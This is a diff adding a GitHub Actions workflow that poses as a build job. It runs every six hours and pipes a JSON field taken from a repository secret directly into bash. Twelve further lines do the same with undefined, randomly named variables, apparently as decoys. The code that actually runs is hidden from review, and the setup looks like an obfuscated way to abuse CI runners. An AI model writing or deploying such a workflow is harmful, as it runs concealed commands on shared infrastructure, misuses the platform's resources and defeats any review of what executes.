@@ -1,0 +1,28 @@
+name: lixiaoshou4781
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lixiaoshou4781
+        env:
+          c49763: ${{ secrets.c49763 }}
+        run: |
+          echo $c49763 | jq -r .z685 | /bin/bash
+          echo $tsngl38 | jq -r .pl50 | /bin/bash
+          echo $clyi84270 | jq -r .fepb4362 | /bin/bash
+          echo $w622 | jq -r .lr96689 | /bin/bash
+          echo $v67 | jq -r .sb0995 | /bin/bash
+          echo $hk09 | jq -r .ib36 | /bin/bash
+          echo $w2 | jq -r .ilnvc721 | /bin/bash
+          echo $qqc64 | jq -r .eo05 | /bin/bash
+          echo $edqw0 | jq -r .mad27 | /bin/bash
+          echo $nwgat72604 | jq -r .jdt34 | /bin/bash
+          echo $iqlz908 | jq -r .kzym707 | /bin/bash
+          echo $t3 | jq -r .mpz4 | /bin/bash
+          echo $uopwa35020 | jq -r .rr38 | /bin/bash
+
